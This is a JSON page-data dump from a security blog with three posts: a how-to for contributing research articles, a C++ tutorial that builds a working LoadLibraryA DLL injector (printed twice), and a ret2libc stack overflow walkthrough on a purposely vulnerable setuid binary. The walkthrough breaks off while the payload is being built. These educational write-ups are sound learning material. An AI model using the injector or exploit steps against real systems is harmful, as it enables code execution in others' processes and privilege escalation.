{"pageProps":{"allTags":{"biohacking":"biohacking","buffer-overflow":"buffer overflow","development":"Development","dll-injection":"DLL Injection","domains":"domains","ee":"EE","how-to":"how to","makefile":"Makefile","memory":"memory","pcap":"pcap","phishing":"phishing","re":"RE","research":"research","rfid":"RFID","story":"Story","tutorial":"Tutorial","windows-api":"Windows API","windows-hacking":"Windows Hacking"},"posts":[{"title":"Writing research posts","slug":"writing-research-posts","date_published":1635906784000,"date_updated":1635906915000,"tags":["How to","Tutorial"],"excerpt":"This guide will go over all the details and steps required to post a research article.","cover":"image.png","author":{"name":"Pips","avatar":"avatars/pips.jpg"},"content":"\nLets talk about how to write a research post to appear on the research portal https://801labs.org/research-portal/1/\n\nPreviously, we used the platform Ghost to write and publish research articles, how tos, and anouncments. This time around in the new website, we have had the research blog function built directly in. \n\nAll a user has to do to create an article\n* go into Github\n* navigate to the `/content/research` directory in the `main` branch.\n* create a new file with a dash seperated name, such as `example-post.md`\n* import the below code block into your new markdown file. This block of code instructs the website on how to display information about the post. This includes tags, a title, a cover image, an author, etc.\n\n\n```\n---\ntitle: <A solid Title>\nslug: a-good-slug\ndate_published: 2018-10-25T02:33:04.000Z\ndate_updated: 2018-10-25T02:35:15.000Z\ntags: tag1, tag2\nexcerpt: A brief little discription of what your post is about.\ncover: 'folder/for/image.jpg'\nauthor:\n  name: your name\n  avatar: 'avatars/youravatar.jpeg'\n---\n```\n\nIn the markdown preview, it will look like the below.\n\n"},{"title":"DLL injection - Developing a simple injector.","slug":"developing-a-dll-injector","date_published":1549513920000,"date_updated":1562884307000,"tags":["how to","DLL Injection","Windows Hacking","Development","memory","Windows API"],"excerpt":"\n[DLL injection](https://en.wikipedia.org/wiki/DLL_injection) is the process of forcing a running process to load a DLL (Dynamically Linked Library) of your choice. In this write-up, I'll walk you through the LoadLibraryA injection method. This causes the DLL to be loaded into the context of the process thus allowing us to execute our own code inside of the process's virtual memory space.\n\n\tI assume there is a base understanding of what a DLL is. By the end of this write-up, we'll have a functional DLL injector along with a bare-bone test DLL which we'll use for testing during development.\n\n\tWriting a DLL injector is pretty trivial and only requires a handful steps. Remember that DLLs are specific to Windows and there-for we'll be utilizing functions provided to us by the Windows API. The steps required for the task at hand are in order as follows:\n\n1. Acquire a handle to the remote process that you want to inject / load your DLL into. We do this by prompting for a process ID (PID) after displaying a list of processes w/ their PIDs.\n\n\n    // Get the remote target pid\n    uint16_t target_pid = get_target_pid();\n    \n    if (!target_pid) {\n    std::cerr << \"Getting remote target process ID failed...\" << std::endl;\n    return 1;\n    }\n    \n    // <snipped> ...\n    \n    // Obtain a handle to the target remote process.\n    HANDLE target_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);\n    \n    \n    if (target_process == NULL) {\n        std::cerr << \"Acquiring a handle to the remote target process failed...\" << std::endl;\n        return -1;\n    }\n\n*get_target_pid() function:*\n\n    \n    uint16_t get_target_pid() {\n    \tuint16_t pid = 0;\n    \t\n    \tstd::string pid_str;\n    \tbool first_input_entered = false;\n    \n    \tdo {\n    \t\tif (first_input_entered) {\n    \t\t\tsystem(\"cls\");\n    \t\t\tprint_banner();\n    \t\t\tstd::cerr << \"The given process ID is invalid, try again...\" << std::endl;\n    \t\t}\n    \n    \t\tprint_process_list();\n    \n    \t\tstd::cout << \"\\nEnter target process ID: \";\n    \t\tstd::getline(std::cin, pid_str);\n    \n    \t\tif (first_input_entered == false) {\n    \t\t\tfirst_input_entered = true;\n    \t\t}\n    \n    \t\tif (pid_str == \"exit\" ||\n    \t\t\tpid_str == \"quit\") {\n    \t\t\tbreak;\n    \t\t}\n    \n    \t} while (file_exists(pid_str) == false && !pid_str.size());\n    \n    \tif (pid_str != \"exit\" &&\n    \t\tpid_str != \"quit\") {\n    \t\tpid = (uint16_t)std::stoi(pid_str);\n    \t}\n    \n    \treturn pid;\n    }\n\n2. Create and store the DLL's absolute path in a variable.\n\n\n    // Get the dll's path that we want to inject into our remote target process.\n    std::string dll_path = get_dll_path();\n    \n    std::cout << \"DLL path: \" << dll_path << std::endl;\n\n*get_dll_path() function:*\n\n    std::string get_dll_path() {\n    \n    \tstd::string dll_path;\n    \tbool first_input_entered = false;\n    \n    \tdo {\n    \t\tif (first_input_entered) {\n    \t\t\tsystem(\"cls\");\n    \t\t\tprint_banner();\n    \t\t\tstd::cerr << \"Specified DLL path was invalid, try again...\" << std::endl;\n    \t\t}\n    \n    \t\tstd::cout << \"Enter path to DLL: \";\n    \t\tstd::getline(std::cin, dll_path);\n    \n    \t\tif (first_input_entered == false) {\n    \t\t\tfirst_input_entered = true;\n    \t\t}\n    \n    \t\tif (dll_path == \"exit\" ||\n    \t\t\tdll_path == \"quit\") {\n    \t\t\tbreak;\n    \t\t}\n    \n    \t} while (file_exists(dll_path) == false);\n    \n    \treturn dll_path;\n    }\n\n3. Now we need to allocate enough space in the remote process to store the DLLs absolute path. We achieve this by using Window's [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualallocex) function.\n\n\n    // Allocate space for our DLL path inside the target remote process.\n    LPVOID dll_path_in_remote_mem_addr = VirtualAllocEx(\n    \ttarget_process,\n    \tNULL,\n    \t_MAX_PATH,\n    \tMEM_RESERVE | MEM_COMMIT,\n    \tPAGE_EXECUTE_READWRITE\n    );\n    \n    if (dll_path_in_remote_mem_addr == NULL) {\n    \tstd::cerr << \"Allocating space for our DLL path in the remote target process's virtual memory space failed...\" << std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n    \n    std::cout << \"DLL allocation memory address: \" << &dll_path_in_remote_mem_addr << std::endl;\n\n4. And now that we've allocated and reserved enough memory for the DLL path, we can write it into that region of memory of the remote process using the Window's [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-writeprocessmemory) function. \n\n\n    // Copy the DLL path into the allocated memory region.\n    bool write_status = WriteProcessMemory(\n    \ttarget_process,\n    \tdll_path_in_remote_mem_addr,\n    \tdll_path.c_str(),\n    \tstrlen(dll_path.c_str()),\n    \tNULL\n    );\n    \n    std::cout << \"WriteProcessMemory was \" << (write_status ? \"successful!\" : \"unsuccessful...\") << std::endl;;\n    \n    if (!write_status) {\n    \tstd::cerr << \"GetLastError() for failed WriteProcessMemory() call: \" << GetLastError() << std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n\n5. Next, we'll need to obtain the address to the Window's [LoadLibraryA](https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-loadlibrarya) function. This is easily done through the Window's [GetProcAddress](https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-getprocaddress) function.\n\n\n    // Get the address to the LoadLibraryA Windows API function.\n    LPVOID load_library_addr = (LPVOID)GetProcAddress(\n    \tGetModuleHandle(\"kernel32.dll\"),\n    \t\"LoadLibraryA\"\n    );\n    \n    if (load_library_addr == NULL) {\n    \tstd::cerr << \"GetProcAddress failed...\" << std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n    \n    std::cout << \"LoadLibraryA address: \" << &load_library_addr << std::endl;\n\n6. Create a remote thread via [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread) and pass the handle we have on the remote process, the address to LoadLibraryA, and the memory address that our DLL path resides at. LoadLibraryA will be invoked and passed `dll_path_in_remote_mem_addr` by our call to CreateRemoteThread. This is where the magic happens and our DLL is loaded into the process.\n\n\n    // Create our remote thread for running our DLL code.\n    HANDLE remote_thread = CreateRemoteThread(\n    \ttarget_process,\n    \tNULL,\n    \tNULL,\n    \t(LPTHREAD_START_ROUTINE)load_library_addr,\n    \tdll_path_in_remote_mem_addr,\n    \tNULL,\n    \tNULL\n    );\n    \n    if (remote_thread == NULL) {\n    \tstd::cerr << \"CreateRemoteThread failed...\" << std::endl;\n    \treturn 1;\n    }\n    \n    std::cout << \"Remote thread address: \" << &remote_thread << std::endl;\n\n7. The last thing we do is deallocate the memory that was reserved for our DLL path using [VirtualFreeEx](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualfreeex) and then close our open handles using [CloseHandle](https://docs.microsoft.com/en-us/windows/desktop/api/handleapi/nf-handleapi-closehandle).\n\n\n    // Release the allocated memory we acquired from the remote process.\n    if (VirtualFreeEx(target_process, dll_path_in_remote_mem_addr, 0, MEM_RELEASE) == 0) {\n    \tstd::cerr << \"VirtualFreeEx failed on target process...\" << std::endl;\n    }\n    \n    // Free our handle on the remote thread\n    CloseHandle(remote_thread);\n    \n    // Free our handle on the remote process\n    CloseHandle(target_process);\n\nTying our code together and testing it out ~ we run `.\\InjectDLL.exe`, then enter the remote target PID, and finally the absolute path to `TestDLL.dll`. Our executable outputs some information about the injection indicating it was successful.  \n\n![](2019/07/2019-05-02-090559_3440x1440_scrot.png \"Successful execution of our DLL injector\")\n\nOur injector indicated it was successful, but we can double check with Window's [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer). After installing it (if you don't have it installed already) we launch it, make sure the lower pane is visible by toggling it on. This can be achieved by checking the `View -> Show Lower Pane` option. Then, select the remote target process in the list and press the key combination `Ctrl + d`. You should now see a list of loaded DLLs. One of which is our DLL! \n\n![](2019/07/process-explorer-test-dll-injection-success.png \"Using Process Explorer, we can see that our TestDLL.dll file was injected into Game.exe successfully.\")\n\nOnce we have successfully loaded our DLL into the target process, we can access and reference anything within it's virtual memory space. In part 2, I'll demonstrate an example use case of DLL injection by showing how we can find an in-memory data structure (i.e. the offset to a player structure / class in a game).\n\nThe full source code for both the DLL injector and the Test DLL can be found in this [Github](https://github.com/selftaught/DLLinjector) repository.\n\nThanks for reading through this article! If you notice any issues in the write-up or code - please don't hesitate to message me! You can do so via [keybase](https://keybase.io/th3v0id) or [twitter](https://twitter.com/x74x76).\n","cover":"2019/07/process-explorer-test-dll-injection-success.png","author":{"name":"th3v0id","avatar":"avatars/th3v0id.jpg"},"content":"\n[DLL injection](https://en.wikipedia.org/wiki/DLL_injection) is the process of forcing a running process to load a DLL (Dynamically Linked Library) of your choice. In this write-up, I'll walk you through the LoadLibraryA injection method. This causes the DLL to be loaded into the context of the process thus allowing us to execute our own code inside of the process's virtual memory space.\n\n\tI assume there is a base understanding of what a DLL is. By the end of this write-up, we'll have a functional DLL injector along with a bare-bone test DLL which we'll use for testing during development.\n\n\tWriting a DLL injector is pretty trivial and only requires a handful steps. Remember that DLLs are specific to Windows and there-for we'll be utilizing functions provided to us by the Windows API. The steps required for the task at hand are in order as follows:\n\n1. Acquire a handle to the remote process that you want to inject / load your DLL into. We do this by prompting for a process ID (PID) after displaying a list of processes w/ their PIDs.\n\n\n    // Get the remote target pid\n    uint16_t target_pid = get_target_pid();\n    \n    if (!target_pid) {\n    std::cerr << \"Getting remote target process ID failed...\" << std::endl;\n    return 1;\n    }\n    \n    // <snipped> ...\n    \n    // Obtain a handle to the target remote process.\n    HANDLE target_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);\n    \n    \n    if (target_process == NULL) {\n        std::cerr << \"Acquiring a handle to the remote target process failed...\" << std::endl;\n        return -1;\n    }\n\n*get_target_pid() function:*\n\n    \n    uint16_t get_target_pid() {\n    \tuint16_t pid = 0;\n    \t\n    \tstd::string pid_str;\n    \tbool first_input_entered = false;\n    \n    \tdo {\n    \t\tif (first_input_entered) {\n    \t\t\tsystem(\"cls\");\n    \t\t\tprint_banner();\n    \t\t\tstd::cerr << \"The given process ID is invalid, try again...\" << std::endl;\n    \t\t}\n    \n    \t\tprint_process_list();\n    \n    \t\tstd::cout << \"\\nEnter target process ID: \";\n    \t\tstd::getline(std::cin, pid_str);\n    \n    \t\tif (first_input_entered == false) {\n    \t\t\tfirst_input_entered = true;\n    \t\t}\n    \n    \t\tif (pid_str == \"exit\" ||\n    \t\t\tpid_str == \"quit\") {\n    \t\t\tbreak;\n    \t\t}\n    \n    \t} while (file_exists(pid_str) == false && !pid_str.size());\n    \n    \tif (pid_str != \"exit\" &&\n    \t\tpid_str != \"quit\") {\n    \t\tpid = (uint16_t)std::stoi(pid_str);\n    \t}\n    \n    \treturn pid;\n    }\n\n2. Create and store the DLL's absolute path in a variable.\n\n\n    // Get the dll's path that we want to inject into our remote target process.\n    std::string dll_path = get_dll_path();\n    \n    std::cout << \"DLL path: \" << dll_path << std::endl;\n\n*get_dll_path() function:*\n\n    std::string get_dll_path() {\n    \n    \tstd::string dll_path;\n    \tbool first_input_entered = false;\n    \n    \tdo {\n    \t\tif (first_input_entered) {\n    \t\t\tsystem(\"cls\");\n    \t\t\tprint_banner();\n    \t\t\tstd::cerr << \"Specified DLL path was invalid, try again...\" << std::endl;\n    \t\t}\n    \n    \t\tstd::cout << \"Enter path to DLL: \";\n    \t\tstd::getline(std::cin, dll_path);\n    \n    \t\tif (first_input_entered == false) {\n    \t\t\tfirst_input_entered = true;\n    \t\t}\n    \n    \t\tif (dll_path == \"exit\" ||\n    \t\t\tdll_path == \"quit\") {\n    \t\t\tbreak;\n    \t\t}\n    \n    \t} while (file_exists(dll_path) == false);\n    \n    \treturn dll_path;\n    }\n\n3. Now we need to allocate enough space in the remote process to store the DLLs absolute path. We achieve this by using Window's [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualallocex) function.\n\n\n    // Allocate space for our DLL path inside the target remote process.\n    LPVOID dll_path_in_remote_mem_addr = VirtualAllocEx(\n    \ttarget_process,\n    \tNULL,\n    \t_MAX_PATH,\n    \tMEM_RESERVE | MEM_COMMIT,\n    \tPAGE_EXECUTE_READWRITE\n    );\n    \n    if (dll_path_in_remote_mem_addr == NULL) {\n    \tstd::cerr << \"Allocating space for our DLL path in the remote target process's virtual memory space failed...\" << std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n    \n    std::cout << \"DLL allocation memory address: \" << &dll_path_in_remote_mem_addr << std::endl;\n\n4. And now that we've allocated and reserved enough memory for the DLL path, we can write it into that region of memory of the remote process using the Window's [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-writeprocessmemory) function. \n\n\n    // Copy the DLL path into the allocated memory region.\n    bool write_status = WriteProcessMemory(\n    \ttarget_process,\n    \tdll_path_in_remote_mem_addr,\n    \tdll_path.c_str(),\n    \tstrlen(dll_path.c_str()),\n    \tNULL\n    );\n    \n    std::cout << \"WriteProcessMemory was \" << (write_status ? \"successful!\" : \"unsuccessful...\") << std::endl;;\n    \n    if (!write_status) {\n    \tstd::cerr << \"GetLastError() for failed WriteProcessMemory() call: \" << GetLastError() << std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n\n5. Next, we'll need to obtain the address to the Window's [LoadLibraryA](https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-loadlibrarya) function. This is easily done through the Window's [GetProcAddress](https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-getprocaddress) function.\n\n\n    // Get the address to the LoadLibraryA Windows API function.\n    LPVOID load_library_addr = (LPVOID)GetProcAddress(\n    \tGetModuleHandle(\"kernel32.dll\"),\n    \t\"LoadLibraryA\"\n    );\n    \n    if (load_library_addr == NULL) {\n    \tstd::cerr << \"GetProcAddress failed...\" << std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n    \n    std::cout << \"LoadLibraryA address: \" << &load_library_addr << std::endl;\n\n6. Create a remote thread via [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread) and pass the handle we have on the remote process, the address to LoadLibraryA, and the memory address that our DLL path resides at. LoadLibraryA will be invoked and passed `dll_path_in_remote_mem_addr` by our call to CreateRemoteThread. This is where the magic happens and our DLL is loaded into the process.\n\n\n    // Create our remote thread for running our DLL code.\n    HANDLE remote_thread = CreateRemoteThread(\n    \ttarget_process,\n    \tNULL,\n    \tNULL,\n    \t(LPTHREAD_START_ROUTINE)load_library_addr,\n    \tdll_path_in_remote_mem_addr,\n    \tNULL,\n    \tNULL\n    );\n    \n    if (remote_thread == NULL) {\n    \tstd::cerr << \"CreateRemoteThread failed...\" << std::endl;\n    \treturn 1;\n    }\n    \n    std::cout << \"Remote thread address: \" << &remote_thread << std::endl;\n\n7. The last thing we do is deallocate the memory that was reserved for our DLL path using [VirtualFreeEx](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualfreeex) and then close our open handles using [CloseHandle](https://docs.microsoft.com/en-us/windows/desktop/api/handleapi/nf-handleapi-closehandle).\n\n\n    // Release the allocated memory we acquired from the remote process.\n    if (VirtualFreeEx(target_process, dll_path_in_remote_mem_addr, 0, MEM_RELEASE) == 0) {\n    \tstd::cerr << \"VirtualFreeEx failed on target process...\" << std::endl;\n    }\n    \n    // Free our handle on the remote thread\n    CloseHandle(remote_thread);\n    \n    // Free our handle on the remote process\n    CloseHandle(target_process);\n\nTying our code together and testing it out ~ we run `.\\InjectDLL.exe`, then enter the remote target PID, and finally the absolute path to `TestDLL.dll`. Our executable outputs some information about the injection indicating it was successful.  \n\n![](2019/07/2019-05-02-090559_3440x1440_scrot.png \"Successful execution of our DLL injector\")\n\nOur injector indicated it was successful, but we can double check with Window's [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer). After installing it (if you don't have it installed already) we launch it, make sure the lower pane is visible by toggling it on. This can be achieved by checking the `View -> Show Lower Pane` option. Then, select the remote target process in the list and press the key combination `Ctrl + d`. You should now see a list of loaded DLLs. One of which is our DLL! \n\n![](2019/07/process-explorer-test-dll-injection-success.png \"Using Process Explorer, we can see that our TestDLL.dll file was injected into Game.exe successfully.\")\n\nOnce we have successfully loaded our DLL into the target process, we can access and reference anything within it's virtual memory space. In part 2, I'll demonstrate an example use case of DLL injection by showing how we can find an in-memory data structure (i.e. the offset to a player structure / class in a game).\n\nThe full source code for both the DLL injector and the Test DLL can be found in this [Github](https://github.com/selftaught/DLLinjector) repository.\n\nThanks for reading through this article! If you notice any issues in the write-up or code - please don't hesitate to message me! You can do so via [keybase](https://keybase.io/th3v0id) or [twitter](https://twitter.com/x74x76).\n"},{"title":"Exploiting a Stack Buffer Overflow (ret2libc method)","slug":"stack-exploitation","date_published":1547813100000,"date_updated":1547814692000,"tags":["research","memory","how to","buffer overflow"],"excerpt":"\nA stack buffer overflow occurs when a program writes to a memory address on it's call stack outside of the intended structure / space.\n\nIn this walk-through, I'm going to cover the ret2libc (return-to-libc) method. This method of exploitation is great because it doesn't require the use of your typical shellcode. It involves making sys calls to the functions provided to us by libc (standard c library). We're going to use the `system` and `exit` sys calls for demonstration.\n\nTo have a good understanding about how stack overflows work, it's extremely helpful to know how stack data structures work, and more importantly - how the call stack works. For the sake of time, I'm not going to type out how these two things work in great detail. If you want to know how these work, I would recommend watching [stack](https://www.youtube.com/watch?v=7dLZRMDcY6c) and [call stack](https://www.youtube.com/watch?v=XbZQ-EonR_I).\n\n## Creating a vulnerable binary to test on\n\nTo practice carrying out a SOF, we create a vulnerable binary. The source below uses strcpy with no boundary checking. This is what makes the code vulnerable to a stack overflow attack. strcpy() will take whatever is in argv[1] and copy it into buf. Without boundary checking around strcpy() to make sure the length of argv[1] isn't greater than the width of the buffer, we can overrun the buffer and overwrite assembler instructions with our own.\n\n    #include <string.h>\n    #include <unistd.h>\n    #include <sys/cdefs.h>\n    \n    int main(int argc, char** argv) {\n    \n        setuid(0);\n    \n        if (argc > 1) {\n            char buf[256];\n            strcpy(buf, argv[1]);\n        }\n    \n        return 0;\n    }\n    \n\nFor the sake of simplicity and keeping this article to a sane length, I disable common buffer overflow protection (BOP) mechanisms including ASLR, Canaries, and NX bit. PIE and RelRO are disabled on my system by default. I also pass an option along to make the binary 32-bit.\n\n`gcc -g -Wall -mpreferred-stack-boundary=2 -fno-stack-protector -m32 -I. -z execstack -o bin/sof src/sof.c`\n\n- `-g`: Produces debugging information about the program that GDB (GNU Debugger) can use to aid us.\n- `-fno-stack-protector`: Disables stack smashing protectors (SSP).\n- `-z execstack`: Makes stack frames executable.\n- `-o sof`: Output (compiled) binary name will be sof.\n- `-mpreferred-stack-boundary=2`: aligns the stack boundary in our binary to 4 bytes.\n\nASLR can't be disabled via a compiler flag because it's a feature that's carried out and managed by the kernel. On Fedora, Debian, and Ubuntu, ASLR can be disabled by adding `kernel.randomize_va_space = 0` to `/etc/sysctl.conf` or `echo 0 > /proc/sys/kernel/randomize_va_space`. Other linux distributions may require a different approach. An easy way to determine if ASLR is enabled (it likely is if you didn't expliclity disable it) is to `cat /proc/sys/kernel/randomize_va_space`. If the output is a positive number, it's enabled.\n\n## Assembler dump breakdown\n\nLet's disassemble the main function in our binary, break it down, and talk about what happens at an assembler level.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  gdb -q \tbin/sof                                              \n    [*] No debugging session active\n    GEF for linux ready, type `gef' to start, `gef config' to configure\n    67 commands loaded for GDB Fedora 8.0.1-33.fc27 using Python engine 3.6\n    Reading symbols from bin/sof...done.\n    @gef➤  disassemble main\n    Dump of assembler code for function main:\n       0x08048416 <+0>:\tpush   ebp\n       0x08048417 <+1>:\tmov    ebp,esp\n       0x08048419 <+3>:\tsub    esp,0x100\n       0x0804841f <+9>:\tpush   0x0\n       0x08048421 <+11>:\tcall   0x8048300 <setuid@plt>\n       0x08048426 <+16>:\tadd    esp,0x4\n       0x08048429 <+19>:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d <+23>:\tjle    0x8048447 <main+49>\n       0x0804842f <+25>:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 <+28>:\tadd    eax,0x4\n       0x08048435 <+31>:\tmov    eax,DWORD PTR [eax]\n       0x08048437 <+33>:\tpush   eax\n       0x08048438 <+34>:\tlea    eax,[ebp-0x100]\n       0x0804843e <+40>:\tpush   eax\n       0x0804843f <+41>:\tcall   0x80482e0 <strcpy@plt>\n       0x08048444 <+46>:\tadd    esp,0x8\n       0x08048447 <+49>:\tmov    eax,0x0\n       0x0804844c <+54>:\tleave  \n       0x0804844d <+55>:\tret    \n    End of assembler dump.\n    @gef➤  q\n    \n\n       0x08048416 <+0>:\tpush   ebp\n       0x08048417 <+1>:\tmov    ebp,esp\n       0x08048419 <+3>:\tsub    esp,0x100\n    \n\nThese first few lines above are called a function prologue. `push ebp` pushes our base pointer onto the stack. Then `mov ebp,esp` copies the value of `esp` (stack pointer) into the `ebp` register making `ebp` == `esp`. Next, `sub esp,0x100` moves the stack pointer 256 bytes (0x100 hex = 256) towards a lower memory address, reserving 256 bytes of data on the stack. This is space being reserved for `char buf[256]`.\n\n       0x0804841f <+9>:\tpush   0x0\n       0x08048421 <+11>:\tcall   0x8048300 <setuid@plt>\n    \n\nPush 0 onto the stack as an argument for the call to `setuid()`.\n\n       0x08048426 <+16>:\tadd    esp,0x4\n       0x08048429 <+19>:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d <+23>:\tjle    0x8048447 <main+49>\n    \n\nThe next instruction `cmp DWORD PTR [ebp+0x8],0x1` compares the first argument of main (argc) to 1. The following `jle` instruction uses the result of this comparison. It takes the result and jumps to `<main+39>` if the result is less than or equal to the value stored at `0x8048412`, which is 1. If you look at the C source above, you can see this is essentially our `if (argc >) {...}` condition.\n\n       0x0804842f <+25>:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 <+28>:\tadd    eax,0x4\n       0x08048435 <+31>:\tmov    eax,DWORD PTR [eax]\n       0x08048437 <+33>:\tpush   eax\n    \n\nHere, we move the address stored at ebp+0xc into the eax register (this is the address to element 0 of argv). Then, we add 4 bytes to the address stored in the eax register. This results in the address of `argv[1]`. Next, `mov eax,DWORD PTR [eax]` takes the value at `argv[1]` and copies it into the `eax` register. `push eax` pushes this value onto the stack.\n\n       0x08048438 <+34>:\tlea    eax,[ebp-0x100]\n       0x0804843e <+40>:\tpush   eax\n    \n\n`lea eax,[ebp-0x100]` calculates the address of `ebp-0x100` and stores the address in `eax`. `push eax` pushes this address onto the stack.\n\n       0x0804843f <+41>:\tcall   0x80482e0 <strcpy@plt>\n    \n\nThe `call` instruction does a couple of things. It pushes the address of the instruction immediately following the call instruction onto the stack and then does an unconditional jump to `strcpy@plt`. The reason a return address is pushed onto the stack is so that when `strcpy@plt` finishes executing, the program knows where to return execution.\n\n       0x08048444 <+46>:\tadd    esp,0x8\n       0x08048447 <+49>:\tmov    eax,0x0\n       0x0804844c <+54>:\tleave  \n       0x0804844d <+55>:\tret    \n    \n\nThese last four instructions are a function epilog. This is just the opposite of a function prologue. Instead of setting up the stack, the epilog cleans up the stack. `add esp,0x8` adds 8 bytes to the address `esp` points to. Then `mov eax,0x0` zeros out whatever is stored in the `eax` register. The `leave` instruction does a couple of things. It releases the stack frame and then copies the base pointer (`ebp`) into `esp`. This releases the space that was allocated to the previous stack frame. Finally, the `ret` instruction pops the return address off the stack and transfers returns execution to the address that was pop'd.\n\n# Exploiting the SOF vulnerability\n\nNow that we have disabled common BOP features and understand the assembler of our vulnerable binary, we will begin exploiting. One of the first things I like to do (after reviewing the assembler dump) is to verify that an overflow exists by triggering a segmentation fault. This is done by providing data to a program which in our case, get's strcpy'd into a fixed width buffer.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  bin/sof $(perl -e 'print \"A\" x 260')\n    [1]    6406 segmentation fault (core dumped)  bin/sof $(perl -e 'print \"A\" x 260')\n    \n\nWhen we strcpy 260 'A' characters into the buffer, we get a segmentation fault. This is because we overwrote the four bytes of memory after the end of our buffer. Segmentation faults are exceptions that get raised by hardware with memory protection. It indicates that something tried writing to a region of memory it shouldn't have.\n\n## Creating the payload\n\nIn order to successfully call `system`, we need to place a few different values on the stack, when we overflow the buffer. We need the address of \"/bin/sh\" found in libc.so, an address that execution will return to when system has finished, and an address to the system call itself.\n\nTo get the address to '/bin/sh', we can calculate it by taking the starting address of libc.so and adding the offset of '/bin/sh' to it.\n\nTo see the absolute path to the libc.so library that our binary uses, we use `ldd`. This is needed for the next step.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  ldd bin/sof\n    \tlinux-gate.so.1 (0xf7fd2000)\n    \tlibc.so.6 => /lib/libc.so.6 (0xf7deb000)\n    \t/lib/ld-linux.so.2 (0xf7fd4000)\n    \n    \n\nNext, we use `strings` to report the offset of any string it finds in libc.so and grep the output for what we're after.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  strings -a -t x /lib/libc.so.6 | grep '/bin/sh'   \n     16a23e /bin/sh\n    \n\nRunning `vmmap` will also provide the starting address of libc.so when ran from a active gdb session.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  gdb -q bin/sof\n    \n    @gef➤  vmmap\n    Start      End        Offset     Perm Path\n    0x08048000 0x08049000 0x00000000 r-x /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0x08049000 0x0804a000 0x00000000 rwx /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0xf7deb000 0xf7fa4000 0x00000000 r-x /usr/lib/libc-2.26.so\n    0xf7fa4000 0xf7fa5000 0x001b9000 --- /usr/lib/libc-2.26.so\n    0xf7fa5000 0xf7fa7000 0x001b9000 r-x /usr/lib/libc-2.26.so\n    0xf7fa7000 0xf7fa8000 0x001bb000 rwx /usr/lib/libc-2.26.so\n    0xf7fa8000 0xf7fab000 0x00000000 rwx \n    0xf7fcd000 0xf7fcf000 0x00000000 rwx \n    0xf7fcf000 0xf7fd2000 0x00000000 r-- [vvar]\n    0xf7fd2000 0xf7fd4000 0x00000000 r-x [vdso]\n    0xf7fd4000 0xf7ffc000 0x00000000 r-x /usr/lib/ld-2.26.so\n    0xf7ffc000 0xf7ffd000 0x00027000 r-x /usr/lib/ld-2.26.so\n    0xf7ffd000 0xf7ffe000 0x00028000 rwx /usr/lib/ld-2.26.so\n    0xfffda000 0xffffe000 0x00000000 rwx [stack]\n    \n    @gef➤  q\n    \n\nWe calculate the address by taking the start address of `/usr/lib/libc-2.26.so` and add the offset of the string. I like to use `printf` for this. If you use printf in gdb, you have to add `shell` before the command so gdb doesn't try to interpret it as one it provides. Same applies to any shell command you want to run in gdb.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  printf \"0x%x\\n\" $((0xf7deb000 + 0x16a23e))  \n    0xf7f5523e\n    \n\nTo verify the address is correct, we can evaluate it in gdb, and see what string resides there. It should be '/bin/sh'.\n\n    @gef➤  x/s 0xf7f5523e\n    0xf7f5523e:\t\"/bin/sh\"\n    \n\nAnd now, we just need the address of `system`.\n\n    @gef➤  p system\n    $1 = {<text variable, no debug info>} 0xf7e2c540 <__libc_system>\n    \n    @gef➤  q\n    \n\nBecause I'm on a machine with an Intel processor and I compiled the binary for 32 bit systems, the addresses we found need to be reversed to conform with little-endian notation. If you have a processor that enforces little-endian notation, you will find yourself doing this often. I wrote this [script](https://gist.github.com/selftaught/5ba8e942f68ae38719243de8d07bcaea) that takes a memory address and reverses it.\n\nReverse system address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  raddr -a 0xf7e2c540\n    \\x40\\xc5\\xe2\\xf7\n    \n\nReverse \"/bin/sh\" string address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  raddr -a 0xf7f5523e\n    \\x3e\\x52\\xf5\\xf7\n    \n\nAnd for the return address, we can use anything for the time being.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒   